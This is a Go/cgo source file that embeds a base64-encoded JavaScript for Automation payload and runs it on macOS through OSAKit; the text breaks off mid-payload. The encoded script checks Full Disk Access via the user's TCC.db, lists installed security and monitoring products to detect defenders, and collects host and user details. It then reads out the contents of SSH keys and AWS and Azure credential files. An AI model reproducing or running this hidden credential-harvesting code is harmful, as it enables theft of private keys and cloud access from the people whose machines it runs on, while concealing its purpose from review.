package main

/*
#cgo CFLAGS: -x objective-c
#cgo LDFLAGS: -framework Foundation
#cgo LDFLAGS: -framework OSAKit
#import <Foundation/Foundation.h>
#import <OSAKit/OSAKit.h>
NSString* jxa() {



NSString *mycode = @"T2JqQy5pbXBvcnQoJ0NvY29hJyk7Ck9iakMuaW1wb3J0KCdGb3VuZGF0aW9uJyk7Ck9iakMuaW1wb3J0KCdzdGRsaWInKTsKT2JqQy5pbXBvcnQoJ3NxbGl0ZTMnKTsKdmFyIGN1cnJlbnRBcHAgPSBBcHBsaWNhdGlvbi5jdXJyZW50QXBwbGljYXRpb24oKTsKY3VycmVudEFwcC5pbmNsdWRlU3RhbmRhcmRBZGRpdGlvbnMgPSB0cnVlOwp2YXIgZmlsZU1hbiA9ICQuTlNGaWxlTWFuYWdlci5kZWZhdWx0TWFuYWdlcjsKdmFyIG91dHN0cmluZyA9ICIiOwoKZnVuY3Rpb24gQ2hlY2tzKG9wdGlvbnMpewoKCWZ1bmN0aW9uIFRDQ0NoZWNrKCl7CgkJdmFyIHJlc3VsdHMgPSAiIjsKCQlyZXN1bHRzICs9ICIjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyNcbiI7CgkJcmVzdWx0cyArPSAiRnVsbCBEaXNrIEFjY2VzcyBDaGVja1xuIjsKCQl2YXIgdXNlcm5hbWUgPSAkLk5TVXNlck5hbWUoKS5qcwoJCXRyeXsKCQkJdmFyIGRicGF0aCA9ICcvVXNlcnMvJyArIHVzZXJuYW1lICsgJy9MaWJyYXJ5L0FwcGxpY2F0aW9uXCBTdXBwb3J0L2NvbS5hcHBsZS5UQ0MvVENDLmRiJwoJCQl2YXIgaGFuZGxlID0gJC5OU0ZpbGVIYW5kbGUuZmlsZUhhbmRsZUZvclJlYWRpbmdBdFBhdGgoZGJwYXRoKTsKCQkJdmFyIHNpemUgPSBoYW5kbGUuc2Vla1RvRW5kT2ZGaWxlOwoJCQl2YXIgY29udiA9IHRoaXMudG9TdHJpbmcoc2l6ZSk7CgkJCWlmIChzaXplID09IG51bGwpewoJCQkJcmVzdWx0cyArPSAnWy1dIFlvdXIgY3VycmVudCBhcHAgY29udGV4dCBoYXMgTk9UIHlldCBiZWVuIGdpdmVuIEZEQVxuJzsKCQkJCXJlc3VsdHMgKz0gIiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjI1xuIjsKCQkJCXJldHVybiByZXN1bHRzCgkJCX0KCQkJZWxzZSB7CgkJCQlyZXN1bHRzICs9ICdbK10gWW91ciBjdXJyZW50IGFwcCBjb250ZXh0IEhBUyBBTFJFQURZIGJlZW4gZ2l2ZW4gRkRBISBTaXplIG9mIHRoZSB1c2VyIFRDQy5kYiBmaWxlIGlzICcgKyBzaXplICsgJ1xuJzsKCQkJCXJlc3VsdHMgKz0gIiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjI1xuIjsKCQkJCXJldHVybiByZXN1bHRzCgkJCX0KCQl9CgkJY2F0Y2goZXJyb3IpewoJCQkJcmVzdWx0cyArPSBlcnJvcgoJCQkJcmVzdWx0cyArPSAnXG4nOwoJCQkJcmVzdWx0cyArPSAiIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjXG4iOwoJCQkJcmV0dXJuIHJlc3VsdHMKCgkJCX0KCgl9CgkvLy8vLy8vLwoJZnVuY3Rpb24gU2VjQ2hlY2soKXsKCQl2YXIgcmVzdWx0cyA9ICIiOwoJCXZhciBydW5hcHBzID0gJC5OU1dvcmtzcGFjZS5zaGFyZWRXb3Jrc3BhY2UucnVubmluZ0FwcGxpY2F0aW9ucy5qczsKCQl2YXIgYXBwbGlzdCA9IFtdOwoJCWZvcihsZXQgaSA9IDA7IGkgPCBydW5hcHBzLmxlbmd0aDsgaSsrKXsKCQkJbGV0IGluZm8gPSB7fTsKCQkJaW5mb1snbmFtZSddID0gcnVuYXBwc1tpXS5sb2NhbGl6ZWROYW1lLmpzOwoJCQlhcHBsaXN0LnB1c2goaW5mb1snbmFtZSddKTsKCgkJfQoKCQl2YXIgYWxsYXBwcyA9IGFwcGxpc3QudG9TdHJpbmcoKTsKCQl2YXIgYiA9IDA7CgkJcmVzdWx0cyArPSAiPT09PT0+U2VjdXJpdHkgVG9vbHMgQ2hlY2s6XG4iOwoJCWlmICgoYWxsYXBwcy5pbmNsdWRlcygiQ2JPc3hTZW5zb3JTZXJ2aWNlIikpIHx8IChmaWxlTWFuLmZpbGVFeGlzdHNBdFBhdGgoIi9BcHBsaWNhdGlvbnMvQ2FyYm9uQmxhY2svQ2JPc3hTZW5zb3JTZXJ2aWNlIikpKXsKCQkJcmVzdWx0cyArPSAiWytdIENhcmJvbiBCbGFjayBTZW5zb3IgaW5zdGFsbGVkLlxuIjsKCQkJYiA9IDE7CgkJfQoKCQlpZiAoKGFsbGFwcHMuaW5jbHVkZXMoIkNiRGVmZW5zZSIpKSB8fCAoZmlsZU1hbi5maWxlRXhpc3RzQXRQYXRoKCIvQXBwbGljYXRpb25zL0NvbmZlci5hcHAiKSkpewoJCSAgICAgICAgcmVzdWx0cyArPSAiWytdIENCIERlZmVuc2UgQS9WIGluc3RhbGxlZC5cbiI7CgkJICAgICAgICBiID0gMTsKCQl9CgoJCWlmICgoYWxsYXBwcy5pbmNsdWRlcygiRVNFVCIpKSB8fCAoYWxsYXBwcy5pbmNsdWRlcygiZXNldCIpKSB8fCAoZmlsZU1hbi5maWxlRXhpc3RzQXRQYXRoKCJMaWJyYXJ5L0FwcGxpY2F0aW9uIFN1cHBvcnQvY29tLmVzZXQucmVtb3RlYWRtaW5pc3RyYXRvci5hZ2VudCIpKSl7CgkJICAgICAgICByZXN1bHRzICs9ICJbK10gRVNFVCBBL1YgaW5zdGFsbGVkLlxuIjsKCQkgICAgICAgIGIgPSAxOwoJCX0KCgkJaWYgKChhbGxhcHBzLmluY2x1ZGVzKCJMaXR0bGVzbml0Y2giKSkgfHwgKGFsbGFwcHMuaW5jbHVkZXMoIlNuaXRjaCIpKSB8fCAoZmlsZU1hbi5maWxlRXhpc3RzQXRQYXRoKCIvTGlicmFyeS9MaXR0bGUgU25pdGNoLyIpKSl7CgkJICAgICAgICByZXN1bHRzICs9ICJbK10gTGl0dGxlc25pdGNoIGZpcmV3YWxsIGZvdW5kLlxuIjsKCQkgICAgICAgIGIgPSAxOwoJCX0KCgkJaWYgKChhbGxhcHBzLmluY2x1ZGVzKCJ4YWd0IikpIHx8IChmaWxlTWFuLmZpbGVFeGlzdHNBdFBhdGgoIi9MaWJyYXJ5L0ZpcmVFeWUveGFndCIpKSl7CgkJICAgICAgICByZXN1bHRzICs9ICJbK10gRmlyZUV5ZSBIWCBhZ2VudCBmb3VuZC5cbiI7CgkJICAgICAgICBiID0gMTsKCQl9CgoJCWlmICgoYWxsYXBwcy5pbmNsdWRlcygiZmFsY29uY3RsIikpIHx8IChmaWxlTWFuLmZpbGVFeGlzdHNBdFBhdGgoIi9MaWJyYXJ5L0NTL2ZhbGNvbmQiKSkpewoJCSAgICAgICAgcmVzdWx0cyArPSAiWytdIENyb3dkc3RyaWtlIEZhbGNvbiBhZ2VudCBmb3VuZC5cbiI7CgkJICAgICAgICBiID0gMTsKCQl9CgoJCWlmICgoYWxsYXBwcy5pbmNsdWRlcygiT3BlbkROUyIpKSB8fCAoYWxsYXBwcy5pbmNsdWRlcygib3BlbmRucyIpKSB8fCAoZmlsZU1hbi5maWxlRXhpc3RzQXRQYXRoKCIvTGlicmFyeS9BcHBsaWNhdGlvbiBTdXBwb3J0L09wZW5ETlMgUm9hbWluZyBDbGllbnQvZG5zLXVwZGF0ZXIiKSkpewoJCSAgICAgICAgcmVzdWx0cyArPSAiWytdIE9wZW5ETlMgY2xpZW50IGZvdW5kLlxuIjsKCQkgICAgICAgIGIgPSAxOwoJCX0KCgkJaWYgKChhbGxhcHBzLmluY2x1ZGVzKCJTZW50aW5lbE9uZSIpKSB8fCAoYWxsYXBwcy5pbmNsdWRlcygic2VudGluZWxvbmUiKSkpewoJCSAgICAgICAgcmVzdWx0cyArPSAiWytdIFNlbnRpbmVsIE9uZSBhZ2VudCBmb3VuZC5cbiI7CgkJICAgICAgICBiID0gMTsKCQl9CgoJCWlmICgoYWxsYXBwcy5pbmNsdWRlcygiR2xvYmFsUHJvdGVjdCIpKSB8fCAoYWxsYXBwcy5pbmNsdWRlcygiUGFuR1BTIikpIHx8IChmaWxlTWFuLmZpbGVFeGlzdHNBdFBhdGgoIi9MaWJyYXJ5L0xvZ3MvUGFsb0FsdG9OZXR3b3Jrcy9HbG9iYWxQcm90ZWN0IikpIHx8IChmaWxlTWFuLmZpbGVFeGlzdHNBdFBhdGgoIi9MaWJyYXJ5L1BhbG9BbHRvTmV0d29ya3MiKSkpewoJCSAgICAgICAgcmVzdWx0cyArPSAiWytdIEdsb2JhbCBQcm90ZWN0IFBBTiBWUE4gY2xpZW50IGZvdW5kLlxuIjsKCQkgICAgICAgIGIgPSAxOwoJCX0KCgkJaWYgKChhbGxhcHBzLmluY2x1ZGVzKCJIb3N0Q2hlY2tlciIpKSB8fCAoYWxsYXBwcy5pbmNsdWRlcygicHVsc2VzZWN1cmUiKSkgfHwgKGZpbGVNYW4uZmlsZUV4aXN0c0F0UGF0aCgiL0FwcGxpY2F0aW9ucy9QdWxzZSBTZWN1cmUuYXBwIikpIHx8IChhbGxhcHBzLmluY2x1ZGVzKCJQdWxzZS1TZWN1cmUiKSkpewoJCSAgICAgICAgcmVzdWx0cyArPSAiWytdIFB1bHNlIFZQTiBjbGllbnQgZm91bmQuXG4iOwoJCSAgICAgICAgYiA9IDE7CgkJfQoKCQlpZiAoKGFsbGFwcHMuaW5jbHVkZXMoIkFNUC1mb3ItRW5kcG9pbnRzIikpIHx8IChmaWxlTWFuLmZpbGVFeGlzdHNBdFBhdGgoIi9vcHQvY2lzY28vYW1wIikpKXsKCQkgICAgICAgIHJlc3VsdHMgKz0gIlsrXSBDaXNjbyBBTVAgZm9yIGVuZHBvaW50cyBmb3VuZC5cbiI7CgkJICAgICAgICBiID0gMTsKCQl9CgoJCWlmICgoZmlsZU1hbi5maWxlRXhpc3RzQXRQYXRoKCIvdXNyL2xvY2FsL2Jpbi9qYW1mIikpIHx8IChmaWxlTWFuLmZpbGVFeGlzdHNBdFBhdGgoIi91c3IvbG9jYWwvamFtZiIpKSl7CgkJICAgICAgICByZXN1bHRzICs9ICJbK10gSkFNRiBmb3VuZCBvbiB0aGlzIGhvc3QuXG4iOwoJCSAgICAgICAgYiA9IDE7CgkJfQoKCQlpZiAoZmlsZU1hbi5maWxlRXhpc3RzQXRQYXRoKCIvTGlicmFyeS9BcHBsaWNhdGlvbiBTdXBwb3J0L01hbHdhcmVieXRlcyIpKXsKCQkgICAgICAgIHJlc3VsdHMgKz0gIlsrXSBNYWx3YXJlYnl0ZXMgQS9WIGZvdW5kLlxuIjsKCQkgICAgICAgIGIgPSAxOwoJCX0KCgkJaWYgKGZpbGVNYW4uZmlsZUV4aXN0c0F0UGF0aCgiL3Vzci9sb2NhbC9iaW4vb3NxdWVyeWkiKSl7CgkJICAgICAgICByZXN1bHRzICs9ICJbK10gb3NxdWVyeSBmb3VuZC5cbiI7CgkJICAgICAgICBiID0gMTsKCQl9CgoJCWlmIChmaWxlTWFuLmZpbGVFeGlzdHNBdFBhdGgoIi9MaWJyYXJ5L1NvcGhvcyBBbnRpLVZpcnVzLyIpKXsKCQkgICAgICAgIHJlc3VsdHMgKz0gIlsrXSBTb3Bob3MgQS9WIGZvdW5kLlxuIjsKCQkgICAgICAgIGIgPSAxOwoJCX0KCgkJaWYgKChhbGxhcHBzLmluY2x1ZGVzKCJsdWx1IikpIHx8IChmaWxlTWFuLmZpbGVFeGlzdHNBdFBhdGgoIi9MaWJyYXJ5L09iamVjdGl2ZS1TZWUvTHVsdSIpKSB8fCAoZmlsZU1hbi5maWxlRXhpc3RzQXRQYXRoKCIvQXBwbGljYXRpb25zL0x1THUuYXBwIikpKXsKCQkgICAgICAgIHJlc3VsdHMgKz0gIlsrXSBMdUx1IGZpcmV3YWxsIGZvdW5kLlxuIjsKCQkgICAgICAgIGIgPSAxOwoJCX0KCgkJaWYgKChhbGxhcHBzLmluY2x1ZGVzKCJkbmQiKSkgfHwgKGZpbGVNYW4uZmlsZUV4aXN0c0F0UGF0aCgiL0xpYnJhcnkvT2JqZWN0aXZlLVNlZS9ETkQiKSkgfHwgKGZpbGVNYW4uZmlsZUV4aXN0c0F0UGF0aCgiL0FwcGxpY2F0aW9ucy9EbyBOb3QgRGlzdHVyYi5hcHAvIikpKXsKCQkgICAgICAgIHJlc3VsdHMgKz0gIlsrXSBMdUx1IGZpcmV3YWxsIGZvdW5kLlxuIjsKCQkgICAgICAgIGIgPSAxOwoJCX0KCgkJaWYgKChhbGxhcHBzLmluY2x1ZGVzKCJXaGF0c1lvdXJTaWduIikpIHx8IChmaWxlTWFuLmZpbGVFeGlzdHNBdFBhdGgoIi9BcHBsaWNhdGlvbnMvV2hhdHNZb3VyU2lnbi5hcHAiKSkpewoJCSAgICAgICAgcmVzdWx0cyArPSAiWytdIFdoYXRzIFlvdXIgU2lnbiBjb2RlIHNpZ25hdHVyZSBpbmZvIHRvb2wgZm91bmQuXG4iOwoJCSAgICAgICAgYiA9IDE7CgkJfQoKCQlpZiAoKGFsbGFwcHMuaW5jbHVkZXMoIktub2NrS25vY2siKSkgfHwgKGZpbGVNYW4uZmlsZUV4aXN0c0F0UGF0aCgiL0FwcGxpY2F0aW9ucy9Lbm9ja0tub2NrLmFwcCIpKSl7CgkJICAgICAgICByZXN1bHRzICs9ICJbK10gS25vY2sgS25vY2sgcGVyc2lzdGVuY2UgZGV0ZWN0aW9uIHRvb2wgZm91bmQuXG4iOwoJCSAgICAgICAgYiA9IDE7CgkJfQoKCQlpZiAoKGFsbGFwcHMuaW5jbHVkZXMoInJlaWtleSIpKSB8fCAoZmlsZU1hbi5maWxlRXhpc3RzQXRQYXRoKCIvQXBwbGljYXRpb25zL1JlaUtleS5hcHAiKSkpewoJCSAgICAgICAgcmVzdWx0cyArPSAiWytdIFJlaUtleSBrZXlib2FyZCBldmVudCB0YXBzIGRldGVjdGlvbiB0b29sIGZvdW5kLlxuIjsKCQkgICAgICAgIGIgPSAxOwoJCX0KCgkJaWYgKChhbGxhcHBzLmluY2x1ZGVzKCJPdmVyU2lnaHQiKSkgfHwgKGZpbGVNYW4uZmlsZUV4aXN0c0F0UGF0aCgiL0FwcGxpY2F0aW9ucy9PdmVyU2lnaHQuYXBwIikpKXsKCQkgICAgICAgIHJlc3VsdHMgKz0gIlsrXSBPdmVyU2lnaHQgbWljcm9waG9uZSBhbmQgY2FtZXJhIG1vbml0b3JpbmcgdG9vbCBmb3VuZC5cbiI7CgkJICAgICAgICBiID0gMTsKCQl9CgoJCWlmICgoYWxsYXBwcy5pbmNsdWRlcygiS2V4dFZpZXdyIikpIHx8IChmaWxlTWFuLmZpbGVFeGlzdHNBdFBhdGgoIi9BcHBsaWNhdGlvbnMvS2V4dFZpZXdyLmFwcCIpKSl7CgkJICAgICAgICByZXN1bHRzICs9ICJbK10gS2V4dFZpZXdyIGtlcm5lbCBtb2R1bGUgZGV0ZWN0aW9uIHRvb2wgZm91bmQuXG4iOwoJCSAgICAgICAgYiA9IDE7CgkJfQoKCQlpZiAoKGFsbGFwcHMuaW5jbHVkZXMoImJsb2NrYmxvY2siKSkgfHwgKGZpbGVNYW4uZmlsZUV4aXN0c0F0UGF0aCgiL0FwcGxpY2F0aW9ucy9CbG9ja0Jsb2NrIEhlbHBlci5hcHAiKSkpewoJCSAgICAgICAgcmVzdWx0cyArPSAiWytdIEJsb2NrIEJsb2NrIHBlcnNpc3RlbmNlIGxvY2F0aW9uIG1vbml0b3JpbmcgdG9vbCBmb3VuZC5cbiI7CgkJICAgICAgICBiID0gMTsKCQl9CgoJCWlmICgoYWxsYXBwcy5pbmNsdWRlcygiTmV0aXF1ZXR0ZSIpKSB8fCAoZmlsZU1hbi5maWxlRXhpc3RzQXRQYXRoKCIvQXBwbGljYXRpb25zL05ldGlxdWV0dGUuYXBwIikpKXsKCQkgICAgICAgIHJlc3VsdHMgKz0gIlsrXSBOZXRpcXVldHRlIG5ldHdvcmsgbW9uaXRvcmluZyB0b29sIGZvdW5kLlxuIjsKCQkgICAgICAgIGIgPSAxOwoJCX0KCgkJaWYgKChhbGxhcHBzLmluY2x1ZGVzKCJwcm9jZXNzbW9uaXRvciIpKSB8fCAoZmlsZU1hbi5maWxlRXhpc3RzQXRQYXRoKCIvQXBwbGljYXRpb25zL1Byb2Nlc3NNb25pdG9yLmFwcCIpKSl7CgkJICAgICAgICByZXN1bHRzICs9ICJbK10gT2JqZWN0aXZlIFNlZSBQcm9jZXNzIE1vbml0b3IgdG9vbCBmb3VuZC5cbiI7CgkJICAgICAgICBiID0gMTsKCQl9CgoJCWlmICgoYWxsYXBwcy5pbmNsdWRlcygiZmlsZW1vbml0b3IiKSkgfHwgKGZpbGVNYW4uZmlsZUV4aXN0c0F0UGF0aCgiL0FwcGxpY2F0aW9ucy9GaWxlTW9uaXRvci5hcHAiKSkpewoJCSAgICAgICAgcmVzdWx0cyArPSAiWytdIE9iamVjdGl2ZSBTZWUgRmlsZSBNb25pdG9yIHRvb2wgZm91bmQuXG4iOwoJCSAgICAgICAgYiA9IDE7CgkJfQoKCQlpZiAoYiA9PSAwKXsKCQkJcmVzdWx0cyArPSAiWy1dIE5vIHNlY3VyaXR5IHByb2R1Y3RzIGZvdW5kLiI7CgkJfQoKCQlyZXN1bHRzICs9ICIjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyNcbiI7CgkJcmV0dXJuIHJlc3VsdHMKCgl9CgkvLy8vLy8vLy8vLy8vLy8vLy8KCglmdW5jdGlvbiBTeXNJbmZvKCl7CgkJdmFyIHJlc3VsdHMgPSAiIjsKCQlyZXN1bHRzICs9ICI9PT09PT5TeXN0ZW0gSW5mbyBDaGVjazpcbiI7CgoJCXRyeSB7CgoJdmFyIGVudjEgPSBjdXJyZW50QXBwLnN5c3RlbUF0dHJpYnV0ZSgnX19DRkJ1bmRsZUlkZW50aWZpZXInKTsKCXZhciBlbnYyID0gY3VycmVudEFwcC5zeXN0ZW1BdHRyaWJ1dGUoJ1hQQ19TRVJWSUNFX05BTUUnKTsKCXZhciBlbnYzID0gY3VycmVudEFwcC5zeXN0ZW1BdHRyaWJ1dGUoJ1BBQ0tBR0VfUEFUSCcpOwoKCWlmKGVudjEpewoJCQkJCXJlc3VsdHMgKz0gIlxuLS0tLT4gQ3VycmVudCBDYWxsYmFjayBDb250ZXh0OlxuIjsKCSAgICAgICAgcmVzdWx0cyArPSAoZW52MSk7CgkJCQkJcmVzdWx0cyArPSAnXG5cbic7Cgl9CgoJaWYoZW52Mil7CgkgICAgICAgIGlmKGVudjIgIT0gIjAiKXsKCQkJCQkJcmVzdWx0cyArPSAiLS0tLT4gQ3VycmVudCBDYWxsYmFjayBDb250ZXh0OlxuIjsKCQkJCQkJcmVzdWx0cyArPSAoZW52Mik7CgkJCQkJCXJlc3VsdHMgKz0gJ1xuXG4nOwoKCSAgICAgICAgfQoJfQoKCWlmKGVudjMpewoJCQkJCXJlc3VsdHMgKz0gIi0tLS0+IEN1cnJlbnQgQ2FsbGJhY2sgQ29udGV4dDpcbiI7CgkJCQkJcmVzdWx0cyArPSAoZW52Myk7CgkJCQkJcmVzdWx0cyArPSAnXG5cbic7CgoJfQoKCXZhciBhY2Nlc3NpYmlsaXR5ID0gJC5BWElzUHJvY2Vzc1RydXN0ZWQoKTsKCXJlc3VsdHMgKz0gIlxuLS0tLS0tPiBBY2Nlc3NpYmlsaXR5IFRDQyBDaGVjazpcbiI7CglpZihhY2Nlc3NpYmlsaXR5KXsKCQlyZXN1bHRzICs9ICJbK10gWW91ciBjdXJyZW50IGFwcCBjb250ZXh0IERPRVMgaGF2ZSBBY2Nlc3NpYmlsaXR5IFRDQyBwZXJtaXNzaW9ucy5cbiIKCX0KCWVsc2UgewoJCXJlc3VsdHMgKz0gIlstXSBZb3VyIGN1cnJlbnQgYXBwIGNvbnRleHQgZG9lcyBOT1QgaGF2ZSBBY2Nlc3NpYmlsaXR5IFRDQyBwZXJtaXNzaW9ucy5cbiIKCX0KCgoKCQl2YXIgY3VycnVzZXIgPSBjdXJyZW50QXBwLnN5c3RlbUluZm8oKS5zaG9ydFVzZXJOYW1lOwoJCXJlc3VsdHMgKz0gIlsrXSBDdXJyZW50IHVzZXJuYW1lOiAiICsgY3VycnVzZXIgKyAiXG5cbiI7CgkJdmFyIG1hY2hpbmVuYW1lID0gT2JqQy5kZWVwVW53cmFwKCQuTlNIb3N0LmN1cnJlbnRIb3N0LmxvY2FsaXplZE5hbWUpOwoJCXJlc3VsdHMgKz0gIlsrXSBIb3N0bmFtZTogIiArIG1hY2hpbmVuYW1lICsgIlxuXG4iOwoKCQlsb2NhbHVzZXJzID0gT2JqQy5kZWVwVW53cmFwKGZpbGVNYW4uY29udGVudHNPZkRpcmVjdG9yeUF0UGF0aEVycm9yKCcvVXNlcnMnLCAkKCkpKTsKCQlyZXN1bHRzICs9ICJbK10gTG9jYWwgdXNlciBhY2NvdW50czpcbiI7CgkJZm9yIChrID0gMDsgayA8IGxvY2FsdXNlcnMubGVuZ3RoOyBrKyspewoJCQlyZXN1bHRzICs9IGxvY2FsdXNlcnNba107CgkJCXJlc3VsdHMgKz0gIlxuIjsKCQl9CgoJCXJlc3VsdHMgKz0gIlxuIjsKCQl2YXIgYWRkcmVzc2VzID0gT2JqQy5kZWVwVW53cmFwKCQuTlNIb3N0LmN1cnJlbnRIb3N0LmFkZHJlc3Nlcyk7CgkJcmVzdWx0cyArPSAiWytdIExvY2FsIElQIEFkZHJlc3NlczpcbiI7CgkJZm9yIChpID0gMDsgaSA8IGFkZHJlc3Nlcy5sZW5ndGg7IGkrKyl7CgkJCXJlc3VsdHMgKz0gYWRkcmVzc2VzW2ldOwoJCQlyZXN1bHRzICs9ICJcbiI7CgkJfQoKCQl2YXIgcGxpc3RwYXRoID0gJy9Vc2Vycy8nICsgY3VycnVzZXIgKyAnL0xpYnJhcnkvUHJlZmVyZW5jZXMvY29tLmFwcGxlLkxhdW5jaFNlcnZpY2VzL2NvbS5hcHBsZS5sYXVuY2hzZXJ2aWNlcy5zZWN1cmUucGxpc3QnOwoJCXZhciBjYW5hcnkgPSAwOwoKaWYgKGZpbGVNYW4uZmlsZUV4aXN0c0F0UGF0aChwbGlzdHBhdGgpKXsKICAgICAgICByZXN1bHRzICs9ICJcbj09PT5EZWZhdWx0IGJyb3dzZXI6XG4iOwogICAgICAgIGxldCBkaWN0ID0gJC5OU011dGFibGVEaWN0aW9uYXJ5LmFsbG9jLmluaXRXaXRoQ29udGVudHNPZkZpbGUocGxpc3RwYXRoKTsKICAgICAgICBsZXQgY29udGVudHMgPSBPYmpDLmRlZXBVbndyYXAoZGljdCk7CgogICAgICAgIGlmKGNvbnRlbnRzICE9IHVuZGVmaW5lZCl7CiAgICAgICAgICAgICAgICBmb3IobGV0IGkgPSAwOyBpIDwgY29udGVudHNbJ0xTSGFuZGxlcnMnXS5sZW5ndGg7IGkrKyl7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmKGNvbnRlbnRzWydMU0hhbmRsZXJzJ11baV0uaGFzT3duUHJvcGVydHkoJ0xTSGFuZGxlclJvbGVBbGwnKSl7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdmFyIHggPSBTdHJpbmcoY29udGVudHNbJ0xTSGFuZGxlcnMnXVtpXVsnTFNIYW5kbGVyVVJMU2NoZW1lJ10pOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKHguaW5jbHVkZXMoImh0dHAiKSl7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXN1bHRzICs9IGNvbnRlbnRzWydMU0hhbmRsZXJzJ11baV1bJ0xTSGFuZGxlclJvbGVBbGwnXTsKCQkJCQkJCQkJCQkJCQkJCQkJCQlyZXN1bHRzICs9ICJcbiI7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjYW5hcnkgKz0gMTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGlmKGNhbmFyeSA9PSAwKXsKICAgICAgICAgICAgICAgICAgICAgICAgcmVzdWx0cyArPSAiWy1dIE5vIExTSGFuZGVyVVJMU2NoZW1lIHZhbHVlIGZvdW5kIGZvciBodHRwL2h0dHBzLCBzbyBkZWZhdWx0IGJyb3dzZXIgaXMgbGlrZWx5IFNhZmFyaVxuIjsKICAgICAgICAgICAgICAgIH0KICAgICAgICB9Cgp9CgoKCgoJCXJlc3VsdHMgKz0gIiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjI1xuIjsKCX0KCWNhdGNoKGVycil7CgkJcmVzdWx0cyArPSBlcnI7Cgl9CglyZXR1cm4gcmVzdWx0cwoJfQoJLy8vLy8vLy8vLy8vLy8vLy8vLwoKCWZ1bmN0aW9uIENyZWRTZWFyY2goKXsKCQl2YXIgcmVzdWx0cyA9ICIiOwoJCXZhciBjdXJydXNlciA9IGN1cnJlbnRBcHAuc3lzdGVtSW5mbygpLnNob3J0VXNlck5hbWU7CgkJdmFyIHNzaHBhdGggPSAiL1VzZXJzLyIgKyBjdXJydXNlciArICIvLnNzaCI7CgkJaWYgKGZpbGVNYW4uZmlsZUV4aXN0c0F0UGF0aChzc2hwYXRoKSl7CgkJCXJlc3VsdHMgKz0gIlxuWytdIExvY2FsIFNTSCBjcmVkIHNlYXJjaDpcbiI7CgkJCWxldCBlbnVtZXJhdG9yID0gT2JqQy5kZWVwVW53cmFwKChmaWxlTWFuLmVudW1lcmF0b3JBdFBhdGgoc3NocGF0aCkpLmFsbE9iamVjdHMpOwoJCQl0cnl7CgkJCQlmb3IgKHAgPSAwOyBwIDwgZW51bWVyYXRvci5sZW5ndGg7IHArKyl7CgkJCQkJcmVzdWx0cyArPSBlbnVtZXJhdG9yW3BdICsgIjoiICsgIlxuIjsKCQkJCQlmdWxscGF0aCA9IHNzaHBhdGggKyAiLyIgKyBlbnVtZXJhdG9yW3BdOwoJCQkJCXZhciBmaWxlZGF0YSA9ICQuTlNTdHJpbmcuc3RyaW5nV2l0aENvbnRlbnRzT2ZGaWxlRW5jb2RpbmdFcnJvcihmdWxscGF0aCwkLk5TVVRGOFN0cmluZ0VuY29kaW5nLCAkKCkpLmpzOwoJCQkJCXJlc3VsdHMgKz0gZmlsZWRhdGE7CgkJCQkJcmVzdWx0cyArPSAiXG4iOwoKCQkJCX0KCQkJfQoJCQljYXRjaChlcnIpewoJCQkJcmVzdWx0cyArPSBlcnI7CgkJCX0KCgkJfQoKCQkvL2F3cwoJCXZhciBhd3NwYXRoID0gIi9Vc2Vycy8iICsgY3VycnVzZXIgKyAiLy5hd3MiOwoJCWlmIChmaWxlTWFuLmZpbGVFeGlzdHNBdFBhdGgoYXdzcGF0aCkpewoJCSAgICAgICAgcmVzdWx0cyArPSAiXG5bK10gTG9jYWwgYXdzIGNyZWQgc2VhcmNoOlxuIjsKCQkgICAgICAgIGxldCBlbnVtZXJhdG9yID0gT2JqQy5kZWVwVW53cmFwKChmaWxlTWFuLmVudW1lcmF0b3JBdFBhdGgoYXdzcGF0aCkpLmFsbE9iamVjdHMpOwoJCSAgICAgICAgdHJ5ewoJCSAgICAgICAgICAgICAgICBmb3IgKHAgPSAwOyBwIDwgZW51bWVyYXRvci5sZW5ndGg7IHArKyl7CgkJICAgICAgICAgICAgICAgICAgICAgICAgcmVzdWx0cyArPSBlbnVtZXJhdG9yW3BdICsgIjoiICsgIlxuIjsKCQkgICAgICAgICAgICAgICAgICAgICAgICBmdWxscGF0aCA9IGF3c3BhdGggKyAiLyIgKyBlbnVtZXJhdG9yW3BdOwoJCSAgICAgICAgICAgICAgICAgICAgICAgIHZhciBmaWxlZGF0YSA9ICQuTlNTdHJpbmcuc3RyaW5nV2l0aENvbnRlbnRzT2ZGaWxlRW5jb2RpbmdFcnJvcihmdWxscGF0aCwkLk5TVVRGOFN0cmluZ0VuY29kaW5nLCAkKCkpLmpzOwoJCSAgICAgICAgICAgICAgICAgICAgICAgIHJlc3VsdHMgKz0gZmlsZWRhdGE7CgkJICAgICAgICAgICAgICAgICAgICAgICAgcmVzdWx0cyArPSAiXG4iOwoKCQkgICAgICAgICAgICAgICAgfQoJCSAgICAgICAgfQoJCSAgICAgICAgY2F0Y2goZXJyKXsKCQkgICAgICAgICAgICAgICAgcmVzdWx0cyArPSBlcnI7CgkJICAgICAgICB9CgoJCX0KCgoJCS8vYXp1cmUKCQl2YXIgYXpwYXRoID0gIi9Vc2Vycy8iICsgY3VycnVzZXIgKyAiLy5henVyZSI7CgkJdmFyIGF6cGF0aDIgPSAiL1VzZXJzLyIgKyBjdXJydXNlciArICIvLmF6dXJlIiArICIvYXp1cmVQcm9maWxlLmpzb24iOwoKCQlpZiAoZmlsZU1hbi5maWxlRXhpc3RzQXRQYXRoKGF6cGF0aCkpewoJCQl0cnl7CgkJICAgICAgICByZXN1bHRzICs9ICJcblsrXSBMb2NhbCBhenVyZSBjcmVkIHNlYXJjaDpcbiI7CgkJCXJlc3VsdHMgKz0gIlthenVyZVByb2ZpbGUuanNvbl0iOwoJCQlyZXN1bHRzICs9ICJcbiI7CgkJCXZ